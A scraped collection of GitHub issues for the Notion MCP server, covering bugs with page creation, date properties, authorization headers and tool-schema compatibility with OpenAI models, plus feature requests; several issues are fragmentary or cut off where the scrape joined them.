**Hope this helps some of you get this up and running!** "

Title:
Bug: Fails to create database pages due to an internally generated, malformed 'icon' property.

Description:
Bug Description

When attempting to add a new page (entry) to a Notion database, the notion-mcp-server fails. The error log indicates that the Notion API is rejecting the request because of an incorrectly formatted icon property. Further investigation reveals this malformed icon property is being added to the API request by the MCP server itself by default, even when no icon is requested in the prompt.

Steps to Reproduce:

Successfully configure and connect to the notion-mcp-server.

Provide the tool with a valid Notion Database ID to work with.

Issue a simple prompt to create a new page, for example: ""Add a new entry to the database with the name 'Test Entry'""

Observe the API error in the debug logs.

Expected Behavior:

A new page/entry should be successfully created in the target Notion database.

Actual Behavior:

The operation fails. The debug log shows a repeated API error:
API-post-page (notionApi MCP Server) {...} unknown format ""json"" ignored in schema at path ""#/properties/icon""

The assistant then reports that it is unable to save the page due to this internal error.

Investigation & Additional Context:

To isolate the issue, I explicitly asked the assistant to create a page without an icon: ""Please try again, but do not set any icon for the entry. Skip the icon field.""

The assistant responded that it had never attempted to set an icon field in any of its previous attempts. It confirmed that the error is generated internally by the tool itself, even when no icon is specified.

This confirms that the notion-mcp-server has a defect where it automatically attaches a default, malformed icon object to the pages.create API payload, making it impossible to add entries to any database."

## **Summary**
Date properties with expanded syntax are being ignored during page creation via the Notion API, despite correct syntax and successful validation. The properties are created but remain empty, requiring a separate update operation to populate date values.

## **Bug Details**

### **Environment**
- **API Endpoint:** `/v1/pages` (POST - Create Page)
- **Date:** September 19, 2025
- **API Version:** Current Notion API
- **Access Method:** Claude MCP Server Integration

### **Database Schema**
- **Database ID:** `80f661c3-46a5-49f2-8e13-9c24c9fe47b3`
- **Data Source ID:** `9951534d-5bad-4110-985d-ea7b44c052ca`
- **Date Property Name:** `""Datum""`
- **Property Type:** `date` with expanded properties support

## **Expected Behavior**
When creating a new page with date properties using expanded syntax, all date fields should be populated correctly:
- `""date:Datum:start""` should set the start date
- `""date:Datum:is_datetime""` should set the datetime flag
- `""date:Datum:end""` should set the end date (if provided)

## **Actual Behavior**
- ✅ `""date:Datum:is_datetime""` is correctly set
- ❌ `""date:Datum:start""` is **completely ignored** (not set)
- ❌ `""date:Datum:end""` is **completely ignored** (not set)

## **Test Cases Performed**

### **Test 1: Standard Expanded Properties**
```json
{
  ""parent"": {""type"": ""data_source_id"", ""data_source_id"": ""9951534d-5bad-4110-985d-ea7b44c052ca""},
  ""properties"": {
    ""Name"": ""TEST - Datum prüfen"",
    ""date:Datum:start"": ""2025-09-20"",
    ""date:Datum:is_datetime"": 0
  }
}
```
**Result:** ❌ `date:Datum:start` not set, only `date:Datum:is_datetime` set to 0

### **Test 2: With End Parameter**
```json
{
  ""properties"": {
    ""Name"": ""TEST 4 - Korrekte Expanded Syntax"", 
    ""date:Datum:start"": ""2025-09-20"",
    ""date:Datum:end"": null,
    ""date:Datum:is_datetime"": 0
  }
}
```
**Result:** ❌ Same issue - start and end ignored, only is_datetime set

### **Test 3: Simple Date Property (Control)**
```json
{
  ""properties"": {
    ""Name"": ""TEST 3 - Einfache Syntax"",
    ""Datum"": ""2025-09-20""
  }
}
```
**Result:** ❌ API Error: `""Date type must be expanded: Datum""`

## **Verification of Correct Syntax**

### **Update Operations Work Perfectly**
The same expanded syntax works flawlessly with the `/v1/pages/{page_id}` PATCH endpoint:

```json
PATCH /v1/pages/273c7597-c731-813d-b2f5-e49253f27d66
{
  ""properties"": {
    ""date:Datum:start"": ""2025-09-20"",
    ""date:Datum:is_datetime"": 0
  }
}
```
**Result:** ✅ **Successfully sets the date field**

## **Impact**
- **Workaround Required:** Every date-containing page creation needs a follow-up update operation
- **Performance Impact:** Double API calls for simple date operations
- **Developer Experience:** Inconsistent behavior between CREATE and UPDATE operations
- **Data Integrity:** Risk of pages with incomplete date information

## **Reproduction Steps**
1. Create a Notion database with a date property
2. Use POST `/v1/pages` with expanded date properties in the request body
3. Verify that `date:PropertyName:start` values are ignored
4. Compare with PATCH operation on the same page (works correctly)

## **Expected Fix**
The POST `/v1/pages` endpoint should handle expanded date properties identically to the PATCH `/v1/pages/{page_id}` endpoint, correctly setting all date-related fields during page creation.

## **Current Workaround**
```javascript
// Step 1: Create page without date
const createResponse = await createPage({
  properties: {
    ""Name"": ""Task Name"",
    // Other properties but NO date properties
  }
});

// Step 2: Immediately update with date
await updatePage(createResponse.id, {
  properties: {
    ""date:Datum:start"": ""2025-09-20"",
    ""date:Datum:is_datetime"": 0
  }
});
```

## **Additional Information**
This bug was discovered during automated task creation workflows where consistent date handling is critical for project management systems.

When creating Notion database entries using the MCP (Model Context Protocol) `notion-create-pages` tool with date properties, the Date columns appear **completely empty** in the Notion UI, despite the API returning successful creation responses.

### Symptoms
- ✅ `notion-create-pages` returns successful response
- ❌ Date column shows empty in Notion UI  
- ❌ Only partial date properties saved (`date:PropertyName:is_datetime` only)
- ❌ Missing crucial `date:PropertyName:start` field in fetch results

### Steps to Reproduce
1. Create a database entry with date properties using expanded format:
```json
{
  ""properties"": {
    ""Activity"": ""Test Activity"",
    ""date:Date:start"": ""2025-10-10"",
    ""date:Date:is_datetime"": 0
  }
}
```
2. Check the created entry using `notion-fetch`
3. Observe that only `""date:Date:is_datetime"": 0` persists
4. Verify in Notion UI that Date column appears empty

### Expected Behavior
Both `date:Date:start` and `date:Date:is_datetime` should persist, and the date should display correctly in Notion UI.

### Actual Behavior
Only `date:Date:is_datetime` persists; `date:Date:start` is silently dropped, resulting in empty date columns.

## Root Cause Analysis

The `notion-create-pages` MCP tool **silently drops** the `date:PropertyName:start` field during creation, while preserving other expanded date properties like `date:PropertyName:is_datetime`. This appears to be a **MCP serialization issue** where the tool incorrectly processes expanded date properties.

## Evidence

**✅ Working Example (using different property name):**
```json
{
  ""date:Day:start"": ""2025-07-26"",
  ""date:Day:is_datetime"": 0
}
```

**❌ Broken Example (same format, different property name):**
```json
{
  ""date:Date:is_datetime"": 0
  // Missing: ""date:Date:start"" field silently dropped!
}
```

## Workaround

Use `notion-update-page` instead, which works correctly:

1. Create entry without dates using `notion-create-pages`
2. Update with dates using `notion-update-page`:
```json
{
  ""page_id"": ""created-page-id"",
  ""command"": ""update_properties"", 
  ""properties"": {
    ""date:Date:start"": ""2025-10-10""
  }
}
```

## Related Issues
This appears related to the serialization bugs mentioned in:
- Issue #82: Parameter serialization bug
- Issue #67: Update-pages parsing bug

## Additional Details

### Schema Evidence
The SQLite schema shows all required fields, but only some are saved:
```sql
""date:Date:start"" TEXT,          -- ❌ NOT SAVED by create-pages
""date:Date:end"" TEXT,            -- ❌ NOT SAVED by create-pages  
""date:Date:is_datetime"" INTEGER  -- ✅ SAVED by create-pages
```

### Impact Assessment
- **Affected**: All date properties in any Notion database using `notion-create-pages`
- **Scope**: All expanded property formats (`date:X:start`, `date:X:end`, etc.)
- **Workaround**: Use two-step process (create then update) until fixed

### Testing Results
- **Before Fix**: `notion-fetch` shows only `""date:Date:is_datetime"": 0`
- **After Fix**: `notion-fetch` shows both `""date:Date:start"": ""2025-10-10""` and `""date:Date:is_datetime"": 0`

We're building AI agents that need to work with Notion databases, but the current MCP server is missing some pretty essential tools. Right now there's no way to:

- List entries in a database
- filter/query database entries 

This makes the MCP integration really limited for actual AI automation workflows. I saw Issue #87 mentions similar needs for database querying.

## What we need

Basic database tools that wrap Notion's existing API:

- `notion_list_database_entries` - list all entries in a database
- `notion_query_database` - full query support (like the `/v1/databases/{database_id}/query` endpoint)

_It may be better to actually have this as one tool rather than two separate ones (ie. notion_query_database can return all entries in the database if the query is blank or some special character)_

## Why this matters

Without these tools, AI agents have to use workarounds like generic search, which is super inefficient. As mentioned in #87, simple tasks can consume 50k+ tokens when they should be straightforward database queries.

Common use cases this would enable:
- Task management (find overdue tasks, tasks by assignee, etc.)
- Content workflows (articles by status, category, etc.) 
- Data reporting and analysis

## Context

We're building Shortwave (AI email w/ integrations) and Tasklet (AI work automation) - this is a major blocker for our Notion integrations. I suspect other developers building AI agents hit the same wall.

The Notion API already supports all this - just need it exposed through MCP tools. Thanks for considering this!"

Add environment variables to enable/disable specific Notion MCP tools at runtime for better security, performance, and reduced context size.

## Motivation
Currently all tools load by default. Teams often need only a subset - e.g., read-only agents only need `search` and `fetch`. Selective loading reduces token usage, improves security via least-privilege, and simplifies debugging.

## Implementation

**Environment Variables:**
```bash
# Allow-list (only these tools load)
ENABLED_TOOLS=search,fetch,create-pages

# or

# Deny-list (everything except these)  
DISABLED_TOOLS=move-pages,duplicate-page,create-comment
```

## Example Usage

**Claude Desktop:**
```json
{
  ""mcpServers"": {
    ""notion"": {
      ""command"": ""npx"",
      ""args"": [""-y"", ""@notionhq/notion-mcp-server""],
      ""env"": {
        ""NOTION_TOKEN"": ""ntn_****"",
        ""ENABLED_TOOLS"": ""search,fetch,create-pages""
      }
    }
  }
}
```

**Docker:**
```bash
docker run -e NOTION_TOKEN=ntn_**** \
  -e DISABLED_TOOLS=move-pages,duplicate-page \
  mcp/notion
```

## Benefits
- Smaller schemas = faster discovery + lower token costs
- Least-privilege security for specific workflows  
- Easier debugging with minimal tool surface"
makenotion/notion-mcp-server,3339081006,109,[Bug Report for notion-mcp-server] Critical Bug: MCP Server Not Passing Authorization Header to Notion API,closed,2025-08-20T18:05:02Z,2025-08-23T13:53:04Z,[],ThiagoDallacqua,"## 🐛 Bug Report for makenotion/notion-mcp-server

*This issue is created here as a fallback to manually submit to the official Notion MCP server repository.*

---

### Description
The Notion MCP server fails to include the required `Authorization` header when making API calls to the Notion API, resulting in consistent 401 ""unauthorized"" errors despite having a valid integration token.

### Environment
- **Package**: `@notionhq/notion-mcp-server` (latest via npx)
- **Node Version**: 22.14.0
- **OS**: Linux (WSL2)
- **MCP Client**: Claude Code 0.2.9

### Steps to Reproduce

1. Configure the MCP server with a valid Notion integration token:
```json
{
  ""notion"": {
    ""command"": ""npx"",
    ""args"": [""-y"", ""@notionhq/notion-mcp-server"", ""--transport"", ""stdio""],
    ""env"": {
      ""NOTION_TOKEN"": ""ntn_XXXXXXXXXXXXXXXXXXXXX""
    }
  }
}
```

2. Call any MCP tool, e.g., `API-get-self`
3. Observe 401 error: `""API token is invalid.""`

### Expected Behavior
The MCP server should include the Authorization header and successfully authenticate with the Notion API.

### Actual Behavior
The server makes requests WITHOUT the required headers, as shown in the actual HTTP request captured during debugging:

```
GET /v1/users/me HTTP/1.1
Accept: application/json, text/plain, */*
User-Agent: notion-mcp-server
Host: api.notion.com
```

**Missing headers:**
- `Authorization: Bearer [TOKEN]`
- `Notion-Version: 2022-06-28`

### Root Cause Analysis

Through debugging, I discovered the MCP server's HTTP client is not adding the Authorization header from the environment variable. The error trace shows:

```javascript
Error in http client O [AxiosError]: Request failed with status code 401
    at file:///.../@notionhq/notion-mcp-server/bin/cli.mjs:10:1027
```

When inspecting the actual request object, the headers are missing the Authorization field entirely.

### Verification

The token is 100% valid. Direct API call works perfectly:

```bash
curl -X GET 'https://api.notion.com/v1/users/me' \
  -H 'Authorization: Bearer ntn_XXXXXXXXXXXXXXXXXXXXX' \
  -H 'Notion-Version: 2022-06-28'

# Returns: 200 OK with bot user information
{
  ""object"": ""user"",
  ""id"": ""4e016876-643c-4edd-afce-ea30672dd0f9"",
  ""name"": ""MCP server"",
  ""type"": ""bot"",
  ""bot"": {
    ""workspace_name"": ""Mustech""
  }
}
```

### Impact
This bug makes the MCP server completely unusable with internal integration tokens, forcing users to implement custom workarounds for basic Notion API access.

### Workaround
Created custom helper functions that properly include headers:
```javascript
const options = {
  headers: {
    'Authorization': `Bearer ${NOTION_TOKEN}`,
    'Notion-Version': '2022-06-28',
    'Content-Type': 'application/json'
  }
};
```

Helper functions available at:
- JavaScript: `~/.claude/mcp-servers/notion-wrapper/notion-helpers.js`
- Python: `~/.claude/mcp-servers/notion-wrapper/notion_helpers.py`

### Suggested Fix
The MCP server needs to properly read the `NOTION_TOKEN` environment variable and include it in all API requests as an Authorization header, along with the required Notion-Version header.

### Additional Context
- The MCP server correctly initializes and lists all available tools
- The token is being passed to the MCP server process via environment variable
- The issue appears to be in the HTTP client implementation within the MCP server
- This affects all users trying to use internal integration tokens with the MCP server

```

async def main():
    token = ""TOKEN_HERE"" # Im using internal connection

    config = {

In all cases, I just get 401 Unauthorized.

` httpx.HTTPStatusError: Client error '401 Unauthorized' for url 'https://mcp.notion.com/mcp' `

Could you confirm whether this is actually available or if I’m making a mistake somewhere?

makenotion/notion-mcp-server,3300392982,102,Notion MCP Server Generates Invalid Function Schemas with allOf,open,2025-08-07T12:52:06Z,2025-08-07T12:52:06Z,[],pulphix,"**Notion MCP Server generates invalid function schemas containing `allOf`, which is not permitted by the OpenAI API**

## Description  
When using the Notion MCP server with `pydantic-ai`, the generated function schema for `notion-update-page` includes `allOf` keywords. This structure is not allowed by the OpenAI API, which results in the request being rejected with a 400 error.

## Error Details  

**Full Error (truncated):**
```
status_code: 400, 
model_name: gpt-4.1-nano-2025-04-14, 
body: {
  'message': ""Invalid schema for function 'notion__notion-update-page': In context=('properties', 'data'), 'allOf' is not permitted."", 
  'type': 'invalid_request_error', 
  'param': 'tools[26].function.parameters', 
  'code': 'invalid_function_parameters'
}
```

## Steps to Reproduce  
1. Set up a FastAPI application with `pydantic-ai`  
2. Configure the Notion MCP server connection  
3. Create an agent using the Notion MCP server  
4. Attempt to use the agent for chat/function calling  
5. Observe the failure with the 400 error from OpenAI API  

## Environment  
- **pydantic-ai version**: 0.6.0 (upgraded from 0.5.1)  
- **pydantic version**: 1.10.12  
- **Python version**: 3.11.10  
- **OpenAI API**: gpt-4.1-nano-2025-04-14  
- **MCP Server**: Notion (https://mcp.notion.com/mcp)  

## Root Cause  
The Notion MCP server is generating function schemas that include `allOf` in the JSON schema. The OpenAI API does **not** support `allOf` in function parameter schemas, which causes the request to be rejected with a schema validation error.

## Expected Behavior  
Function schemas should be generated **without `allOf`** to ensure compatibility with the OpenAI API.

## Actual Behavior  
Schemas include `allOf`, which leads to a 400 error response when the function call is sent to the OpenAI API.

This contradicts the documentation, which recommends using `NOTION_TOKEN` for simplicity. The issue seems specific to certain execution contexts (like Python's subprocess via FastAPI/MCPClient) where the MCP server is launched differently than in CLI tools like Cursor or Claude.

When using the `notion-mcp-server` within a FastAPI-based MCP setup (with `mcp-use`), setting the token via:

```json
""env"": {
  ""NOTION_TOKEN"": ""ntn_***""
}
```

**does not** result in a working connection to Notion.

**However,** replacing the environment block with:

```json
""env"": {
  ""OPENAPI_MCP_HEADERS"": ""{\""Authorization\"": \""Bearer ntn_***\"", \""Notion-Version\"": \""2022-06-28\""}""
}
```
**does work** correctly.

This suggests a possible issue in how the server or mcp-use resolves environment variables for the NOTION_TOKEN style config.

Hi guys! The `NOTION_TOKEN` environment variable is not working when using the official Docker Hub image (`mcp/notion`), while `OPENAPI_MCP_HEADERS` works correctly. This is because the Docker Hub image was built 19 days ago and doesn't include the recent `NOTION_TOKEN` functionality.

Both documentation sites ([docker hub](https://hub.docker.com/r/mcp/notion) and your [readme](https://github.com/makenotion/notion-mcp-server/)) mention different environment variables (INTERNAL_NOTION_TOKEN & NOTION_TOKEN) which are not available in the docker image.

## Root Cause

- **Docker Hub image age**: The `mcp/notion` image was built 19 days ago
- **Recent feature addition**: `NOTION_TOKEN` support was added to the codebase after the Docker Hub image was built
- **Missing functionality**: The Docker Hub image only supports `OPENAPI_MCP_HEADERS` authentication method

## Impact

- Users following the recommended `NOTION_TOKEN` approach in documentation cannot use Docker deployment
- Creates inconsistency between documentation and actual functionality having to debug the issue

## Workaround

Use `OPENAPI_MCP_HEADERS` instead of `NOTION_TOKEN`:
```json
{
  ""notion"": {
    ""command"": ""docker"",
    ""args"": [
      ""run"",
      ""-i"",
      ""--rm"",
      ""-e"",
      ""OPENAPI_MCP_HEADERS={\""Authorization\"": \""Bearer YOUR_TOKEN\"", \""Notion-Version\"": \""2022-06-28\""}"",
      ""mcp/notion""
    ]
  }
}
```

I could open a PR to mention this issue but I think that every time your code reaches main it should build the new image. "

- use [MDX](https://mdxjs.com/) instead of a html for rendering custom elements in the page. MDX is generally more strict and easier to parse for tools. 
- By using MDX you can use markdown as the body of a jsx element, if instead you use plain markdown you will be forced to use html for the body of other html tags to be commonmark compliant. 
- toggles now use a custom syntax that consist in indenting the body of the toggle:

## Bug Description
Complex object parameters are being incorrectly serialized as strings in multiple Notion MCP tools, causing ""Expected object, received string"" validation errors.

## Affected Tools
- `create-pages` (when using `parent` parameter)
- `move-pages` (when using `new_parent` parameter)

## Error Message
```
MCP error -32602: Invalid arguments for tool create-pages: [
  {
    ""code"": ""invalid_union"", 
    ""unionErrors"": [{
      ""issues"": [{
        ""code"": ""invalid_type"",
        ""expected"": ""object"", 
        ""received"": ""string"",
        ""path"": [""parent""],
        ""message"": ""Expected object, received string""
      }]
    }]
  }
]
```

## Reproduction

**create-pages example:**
```json
{
  ""pages"": [{""content"": ""test"", ""properties"": {""title"": ""Test""}}],
  ""parent"": {""database_id"": ""example-database-id""}
}
```

**move-pages example:**
```json
{
  ""page_or_database_ids"": [""example-page-id""],
  ""new_parent"": {""database_id"": ""example-database-id""}
}
```

Both fail with the same ""Expected object, received string"" error.

## What Works
- `create-pages` without parent parameter ✅
- `create-database` with parent parameter ✅ (interestingly)
- All simple parameter operations ✅

## Impact
Cannot programmatically populate databases or organize pages, requiring manual entry for all database operations.

makenotion/notion-mcp-server,3210349770,78,Create Page Fails with Property X not found when view contains formula and button columns,open,2025-07-07T21:59:38Z,2025-07-07T21:59:38Z,[],thejackluo,"# Create-page fails with **“Property X not found”** when view contains Formula / Button columns  
*(read-only properties are silently inserted into the payload and cause 400 errors)*

---

## 🐞  Description

If a database **view** includes any *read-only* columns (Formula, Roll-up, Unique ID, Button, Progress Bar, …), the MCP server:

1. Caches those column names on first scan.  
2. Automatically inserts them into every **create-page** / **update-page** request, even when the caller never referenced them.

Because Notion omits read-only properties from `/databases/{id}`, the API rejects the request with 400 validation_error ""Property <Name> not found""

This makes it impossible to use MCP with a “normal” Notion database that mixes editable and computed columns—unless users hide those columns from *all* views or create dummy writable columns.

---

## ✅  Expected behaviour

The MCP server should **omit** any property whose type is `formula`, `rollup`, `button`, `unique_id`, etc. from outgoing JSON, or expose a flag to turn the auto-inclusion off.

---

## ❌  Actual behaviour

Every cached column name is forwarded unconditionally, producing a 400 error as soon as a read-only property is present.

---

## 🔬  Steps to reproduce

1. **Create database**  
   * Table “Tasks” with plain editable properties:  
     * `Name` (title)  
     * `Priority` (select)
2. **Add computed column**  
   * Add **Formula** property named **`Elapsed Time`**.
3. **Share DB** with the Notion integration token used by MCP.
4. **Create page via MCP**

   ```json
   {
     ""parent"": { ""database_id"": ""<DB_ID>"" },
     ""properties"": {
       ""Name"": ""MCP test"",
       ""Priority"": ""High""
     }
   }
   ```

5. 🟥 **Result**

   ```
   400  validation_error  ""Property Elapsed Time not found""
   ```

6. **Hide** `Elapsed Time` from the default table view and repeat step 4 → ✅ succeeds.

## 🛠️  Work-arounds tried

1. Hide every Formula / Button column in **all** views → works but cripples UX.  
2. Add dummy writable columns with identical names → works but pollutes schema.

---

## 💡  Proposed fix

* Before sending `properties` to Notion, **filter out** any name whose `property.type` is not one of the writable types (`title`, `text`, `number`, `select`, `multi_select`, `date`, `checkbox`, `url`, `email`, `phone_number`, `files`, `relation`, `people`).  
* Alternatively, refresh the property cache from `/databases/{id}` before each write (or on a configurable interval) instead of relying on the view list.

Error: Received tool input did not match expected schema

I’m using LangChain with Ollama and LangGraph. The tool call is structured like this:

```ts
{

  properties: {

      ]
    }
  }
}
```
This structure is what Claude produced, but it doesn't match Notion's real API schema. According to the Notion API, the correct shape for properties should be more like:

```ts
properties: {
  title: {
    title: [
      {
        type: ""text"",
        text: {
          content: ""Write-documentation-for-feature""

        text: {
          content: ""create new ai agent""
        }
      }
    ]
  }
}
```

This seems to be a schema mismatch or poor transformation inside the MCP adapter — either:

The OpenAPI spec doesn’t validate the expected nested format

Or the tool handler doesn’t normalize the input into the Notion-compatible structure

I have started using Claude desktop on Macos with the Notion MCP integration. 
Currently facing an issue for the update-page command where the MCP will automatically parse the object for the body as a string, hence failing when sent to the API as it expects an object.

Some details below from debugging with Claude:

Claude sends XML
<parameter name=""body"">{""page_id"": ""abc"", ""command"": ""insert_content_after"", ...}</parameter>

The MCP layer receives
{
  ""body"": ""{\""page_id\"": \""abc\"", \""command\"": \""insert_content_after\"", ...}""
}


Other commands are handling the JSON objects correctly, such as the create-page command. Claude highlighted an important distinction in the schema between create-pages

""required"": [""body""],
""properties"": {
  ""body"": {
    ""properties"": {
      ""pages"": {...},
      ""parent"": {...}
    }
  }
}

and update-page

""required"": [""body""], 
""properties"": {
  ""body"": {
    ""allOf"": [...],
    ""anyOf"": [...]
  }
}


The issue might be the complex allOf/anyOf union structure in the update-page schema.

Summary of the technical issue:
What I discovered:

The function calling interface correctly parses JSON objects for most MCP tools
create-pages works perfectly with object syntax: {""pages"": [...], ""parent"": {...}}
update-page specifically has a bug where it receives objects as strings
This is NOT a general XML/JSON parsing issue - it's a bug in the update-page tool implementation

The exact problem: The update-page MCP tool is not properly deserializing the body parameter from JSON string to object, while other tools in the same MCP package work correctly.

So I asked Claude 4 sonnet to write this issue, I deleted some criticisms written by Claude that may sound overbearing.

## Summary
The Notion API is missing fundamental page management capabilities that are essential for programmatically organizing workspace content. Specifically, there are no APIs to change a page's parent or to control page ordering within a parent container.

## Missing Features

### 1. Change Page Parent API
**Current Issue**: Once a page is created, there's no way to move it to a different parent page via API.

**Expected Behavior**: 
```javascript
// Should be possible to update page parent
await notion.pages.update({
  page_id: ""page-id"",
  parent: {
    type: ""page_id"",
    page_id: ""new-parent-id""
  }
});
```

**Current Workaround**: Manual drag-and-drop in the Notion UI, which defeats the purpose of automation.

### 2. Page Ordering API
**Current Issue**: There's no way to control the order of pages within a parent container.

**Expected Behavior**:
```javascript
// Should be possible to specify page order
await notion.pages.update({
  page_id: ""page-id"",
  order: 1 // or similar ordering mechanism
});

// Or bulk reordering
await notion.pages.reorder({
  parent_id: ""parent-id"",
  page_order: [""page-id-1"", ""page-id-2"", ""page-id-3""]
});
```

## Use Cases

### Content Management Systems
- Automatically organizing imported content into appropriate categories
- Restructuring documentation based on content analysis
- Creating dynamic navigation structures

### Educational Platforms
- Organizing course materials by difficulty or topic
- Automatically sorting student submissions
- Creating personalized learning paths

### Project Management
- Reorganizing project phases and milestones
- Sorting tasks by priority or status
- Creating dynamic project hierarchies

### Knowledge Management
- Categorizing research notes automatically
- Building taxonomies from existing content
- Creating subject-based organization systems

## Real-World Impact

### Developer Experience
Without these APIs, developers must ask users to manually reorganize content, which:
- Breaks automation workflows
- Creates poor user experience
- Limits the potential of Notion integrations
- Forces reliance on manual UI interactions

## Current API Limitations

```javascript
// ❌ This doesn't work - cannot change parent
await notion.pages.update({
  page_id: ""existing-page"",
  parent: { page_id: ""new-parent"" } // Ignored/fails
});

// ❌ This doesn't work - no ordering control
await notion.pages.create({
  parent: { page_id: ""parent"" },
  properties: { title: [{ text: { content: ""New Page"" } }] },
  order: 1 // No such parameter exists
});
```

## Proposed API Design

### Page Parent Update
```javascript
PATCH /v1/pages/{page_id}
{
  ""parent"": {
    ""type"": ""page_id"",
    ""page_id"": ""new-parent-id""
  }
}
```

### Page Ordering
```javascript
PATCH /v1/pages/{page_id}
{
  ""order"": number | ""first"" | ""last"" | { ""after"": ""page_id"" } | { ""before"": ""page_id"" }
}

// Or bulk reordering endpoint
PUT /v1/pages/reorder
{
  ""parent_id"": ""parent-page-id"",
  ""page_order"": [""page-id-1"", ""page-id-2"", ""page-id-3""]
}
```


## Suggested Implementation Timeline

- **Phase 1**: Page parent change API (highest priority)
- **Phase 2**: Basic page ordering (within parent)
- **Phase 3**: Advanced ordering operations (bulk reorder, relative positioning)

## Alternative Solutions Considered

1. **Page Recreation**: Delete and recreate pages in new locations
   - ❌ Loses page history, comments, and references
   
2. **Database-only approach**: Use databases instead of pages
   - ❌ Doesn't solve the fundamental hierarchy management need
   
3. **Manual UI operations**: Ask users to reorganize manually
   - ❌ Defeats the purpose of API automation

makenotion/notion-mcp-server,3051461399,45,Unable to create database items with relation properties via INSERT_ROW_DATABASE,open,2025-05-09T08:42:45Z,2025-05-09T09:28:20Z,[],basichumantastes,"

## Description
### Problem Description
When attempting to create a new page in a Notion database with a relation property using the `INSERT_ROW_DATABASE` function, it fails with a validation error. The API expects relation properties to be formatted as an array of objects with IDs, but the MCP server seems to send the relation value as a string, causing the request to fail.

### Steps to Reproduce
1. Try to create a new page in a database with a relation property to another existing page using the `INSERT_ROW_DATABASE` function
2. Format the request like this:
```json
{
  ""database_id"": ""[DATABASE_ID]"",
  ""properties"": [
    {""name"": ""Name"", ""type"": ""title"", ""value"": ""My New Task""},
    {""name"": ""RelationField"", ""type"": ""relation"", ""value"": ""[RELATED_PAGE_ID]""}
  ]
}
```
3. Observe the error response

### Actual Behavior
The request fails with the following error:
```
body.properties.RelationField.relation should be an array, instead was ""RELATED_PAGE_ID"".
```

The MCP server seems to be treating the relation value as a string rather than properly formatting it as an array of objects with IDs, as required by the Notion API.

### Expected Behavior
The MCP server should properly format the relation property as an array of objects with IDs when sending the request to the Notion API, like this:
```json
{
  ""properties"": {
    ""RelationField"": {
      ""relation"": [
        {
          ""id"": ""RELATED_PAGE_ID""
        }
      ]
    }
  }
}
```

### Context
This issue prevents creating pages with relations in a single step. Currently, users must create the page first, then manually add the relation through the Notion UI.

Examining existing pages with relations shows they are stored in this format:
```json
""RelationField"": {
  ""has_more"": false,
  ""id"": ""xxx"",
  ""relation"": [
    {
      ""id"": ""RELATED_PAGE_ID""
    }
  ],
  ""type"": ""relation""
}
```

### Environment Information
- Package: @notionhq/notion-mcp-server
- OS: macOS
- Claude/Anthropic integration

### Suggested Solution
Consider updating the `INSERT_ROW_DATABASE` function to handle relation properties differently. When a property has `type: ""relation""`, the function should convert the string value to the proper array format expected by the Notion API:
```json
{
  ""relation"": [
    {
      ""id"": ""VALUE_FROM_REQUEST""
    }
  ]
}
```

This would allow creating pages with relation properties in a single step."

The Notion MCP server (@notionhq/notion-mcp-server) generates tool schemas that are incompatible with OpenAI models. Specifically, the tool schemas for array properties are missing the required items field, which causes OpenAI models to reject the request with an error.


### Error Message
When attempting to use OpenAI models (like gpt-4.1 or gpt-4o) with the Notion extension enabled, the following error is returned:
```
{
  ""error"": {
    ""message"": ""Invalid schema for function 'notion__API-patch-block-children': In context=('properties', 'children'), array schema missing items."",
    ""type"": ""invalid_request_error"",
    ""param"": ""tools[18].function.parameters"",
    ""code"": ""invalid_function_parameters""
  }
}
```


### Technical Details
The issue is in the schema definition for the notion__API-patch-block-children tool (and potentially others). According to the OpenAI Function Calling API specification, any property of type array must include an items field that defines what type of items the array can contain.

Current problematic schema:
```
{
  ""function"": {
    ""description"": ""Append block children"",
    ""name"": ""notion__API-patch-block-children"",
    ""parameters"": {
      ""$defs"": {},
      ""properties"": {
        ""after"": {
          ""description"": ""The ID of the existing block that the new block should be appended after."",
          ""type"": ""string""
        },
        ""block_id"": {
          ""description"": ""Identifier for a [block](ref:block). Also accepts a [page](ref:page) ID."",
          ""type"": ""string""
        },
        ""children"": {
          ""description"": ""Child content to append to a container block as an array of [block objects](ref:block)"",
          ""type"": ""array""
        }
      },
      ""required"": [
        ""block_id"",
        ""children""
      ],
      ""type"": ""object""
    }
  },
  ""type"": ""function""
}
```

Corrected schema (with items field added):
```
{
  ""function"": {
    ""description"": ""Append block children"",
    ""name"": ""notion__API-patch-block-children"",
    ""parameters"": {
      ""$defs"": {},
      ""properties"": {
        ""after"": {
          ""description"": ""The ID of the existing block that the new block should be appended after."",
          ""type"": ""string""
        },
        ""block_id"": {
          ""description"": ""Identifier for a [block](ref:block). Also accepts a [page](ref:page) ID."",
          ""type"": ""string""
        },
        ""children"": {
          ""description"": ""Child content to append to a container block as an array of [block objects](ref:block)"",
          ""type"": ""array"",
          ""items"": {
            ""type"": ""object""
          }
        }
      },
      ""required"": [
        ""block_id"",
        ""children""
      ],
      ""type"": ""object""
    }
  },
  ""type"": ""function""
}

```


### Impact
This issue affects all OpenAI models when used with the Notion extension. Anthropic models (like Claude) are more forgiving with schema definitions and work correctly with the current implementation.


### Reproduction Steps
1. Install [Goose Assistant](https://block.github.io/goose/docs/quickstart) 
2. Setup and enable the Notion extension in Goose
3. Configure Goose to use an OpenAI model (e.g., openai/gpt-4.1 or openai/gpt-4o) through OpenRouter or OpenAI
4. Attempt to use Goose in any way, which will result in the error above

### Workarounds
 • Use Anthropic models instead of OpenAI models
 • Disable the Notion extension


### Suggested Fix
Update the schema generation in the Notion MCP server to ensure that all array properties include an items field that defines the type of items the array can contain. This should be done for all tools that include array properties in their parameter schemas.

For the specific case of notion__API-patch-block-children, add ""items"": { ""type"": ""object"" } to the children property definition.

---

### OpenAI Function Calling API Specification References
OpenAI's function calling API follows the JSON Schema specification (Draft 7), which does indeed require that array properties include an items field.

Official Documentation:
- OpenAI Function Calling Documentation:
    • URL: https://platform.openai.com/docs/guides/function-calling
    • Relevant quote: ""The parameters field should be a JSON Schema object describing the parameters that the
      function accepts. Function parameters should follow the JSON Schema specification.""
- JSON Schema Specification (Draft 7):
    • URL: https://json-schema.org/draft-07/json-schema-validation.html#rfc.section.6.4
    • Relevant section: 6.4. Validation Keywords for Arrays
    • Quote: ""The value of items MUST be either a valid JSON Schema or an array of valid JSON Schemas.""
    • This section explicitly states that the items keyword is used to define validation for array items.
- OpenAI API Reference - Function Calling:
    • URL: https://platform.openai.com/docs/api-reference/chat/create#chat-create-functions
    • This page shows examples of function definitions, all of which include the items field for array properties.

Example from OpenAI Documentation:
```
{
  ""name"": ""get_current_weather"",
  ""parameters"": {
    ""type"": ""object"",
    ""properties"": {
      ""locations"": {
        ""type"": ""array"",
        ""items"": {
